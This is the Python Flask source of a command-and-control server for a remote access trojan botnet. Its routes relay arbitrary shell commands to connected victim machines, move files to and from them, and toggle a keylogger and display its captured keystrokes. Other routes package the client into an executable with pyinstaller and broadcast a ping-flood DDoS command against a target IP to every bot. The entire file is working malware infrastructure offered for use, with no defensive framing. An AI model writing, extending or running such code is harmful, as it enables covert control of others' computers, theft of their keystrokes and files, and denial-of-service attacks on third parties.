import socket, threading, time, sys, signal, subprocess, os
from flask import *

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address

ip_address = '0.0.0.0'              #Here goes your servers IP address
port_number = 1234                  #Here goes your preffered port (1234 for default)

# creating lists and index for the lists to control it better for threading
thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []


for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')

app = Flask(__name__)

@app.route("/get_ip")
def get_ip():
    return jsonify({"ip": ip_address})

def handle_connection(connection, address, thread_index):
    global CMD_OUTPUT
    global CMD_INPUT
    global app_msg
    
    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(2048 * 1000).decode('utf-8')
        CMD_OUTPUT[thread_index] = msg
        if msg=='quit':
            THREADS.pop(thread_index)
        
        while True:
            if CMD_INPUT[thread_index] != '':
                if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    cmd = CMD_INPUT[thread_index]

                    connection.send(cmd.encode('utf-8'))
                    contents = connection.recv(2048 * 10000)
                    with open('.\\output\\' + filename, 'wb') as f:
                        f.write(contents)
                    CMD_OUTPUT[thread_index] = "FILE TRANSFER SUCCESSFUL"
                    CMD_INPUT[thread_index] = ''

                elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                    cmd = CMD_INPUT[thread_index]

                    connection.send(cmd.encode('utf-8'))
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    with open('.\\output\\' + filename, 'rb') as f:
                        contents = f.read()
                    connection.send(contents)
                    msg = connection.recv(2048).decode('utf-8')
                    if msg == 'got file':
                        CMD_OUTPUT[thread_index] = "File Sent Successfully"
                        CMD_INPUT[thread_index] = ''
                    else:
                        CMD_INPUT[thread_index] = "Some Error Occurred"
                
                elif CMD_INPUT[thread_index] == "keylog on":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode('utf-8'))
                    msg = connection.recv(2048 * 1000).decode('utf-8')
                    CMD_OUTPUT[thread_index] = msg
                    CMD_INPUT[thread_index] = ''

                elif CMD_INPUT[thread_index] == "keylog off":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode('utf-8'))
                    msg = connection.recv(2048 * 1000).decode('utf-8')
                    CMD_OUTPUT[thread_index] = msg
                    app_msg = msg
                    
                    CMD_INPUT[thread_index] = ''
                
                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode('utf-8'))
                    CMD_INPUT[thread_index] = ''
                    break
    close_connection(connection, thread_index)

def close_connection(connection, thread_index):
    connection.close()
    THREADS[thread_index] = ''
    IPS[thread_index] = ''
    CMD_INPUT[thread_index] = ''
    CMD_OUTPUT[thread_index] = ''

def server_socket():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ss.bind((ip_address, port_number))  # Bind to all available interfaces
    ss.listen(5)
    global THREADS, IPS
    while True:
        connection, address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, thread_index))
        THREADS.append(t)
        IPS.append(address)
        t.start()
        print(f"Connected to {address}")



@app.before_request
def before_request():
    threading.Thread(target=server_socket, daemon=True).start()

@app.route("/")
@app.route("/home")
def home():
    return render_template('index.html')


@app.route('/generate_executable', methods=['POST'])
def generate_executable():
    
    client_script_path = 'Project\\threaded_client.py'

    current_directory = os.getcwd()
    print(f"Current working directory: {current_directory}")

    

    
    subprocess.call(['pyinstaller', '--onefile', client_script_path], cwd=current_directory)
    




    
    return send_file(as_attachment=True)


@app.route("/payload")
def payload():
    return render_template('payload.html')

@app.route("/ddos")
def ddos():
    return render_template('ddos.html')


@app.route("/start_ddos", methods=['POST'])
def start_ddos():
    target_ip = request.form['target_ip']
    command = f"ping {target_ip} -t -l 65500"
    
    # Broadcast the command to all connected clients
    for i, connection in enumerate(THREADS):
        if connection:
            CMD_INPUT[i] = command
    
    return redirect(url_for('ddos'))


@app.route("/connections")
def connections():
    return render_template('devices.html', threads=THREADS, ips=IPS)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template('execute.html', name=agentname)

@app.route("/<agentname>/startkeylogger", methods=['POST'])
def start_keylogger(agentname):
    for i, thread in enumerate(THREADS):
        if agentname in str(thread):
            CMD_INPUT[i] = "keylog on"
    return redirect(url_for('devices'))

@app.route("/<agentname>/stopkeylogger", methods=['POST'])
def stop_keylogger(agentname):
    for i, thread in enumerate(THREADS):
        if agentname in str(thread):
            CMD_INPUT[i] = "keylog off"
            req_index = i
    return redirect(url_for('keylogger', agentname=agentname))

@app.route("/<agentname>/keylogger")
def keylogger(agentname):
    keylogoutput = app_msg
    return render_template('keylogger.html', name=agentname, cmdoutput=keylogoutput)

@app.route("/<agentname>/execute", methods=['GET', 'POST'])
def execute(agentname):
    if request.method == 'POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)

        CMD_INPUT[req_index] = cmd
        cmd_time = 7
        if cmd == 'systeminfo':
            cmd_time = 13
        time.sleep(cmd_time)
        cmdoutput = CMD_OUTPUT[req_index].strip()
        return render_template('execute.html', cmd_output=cmdoutput, name=agentname)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
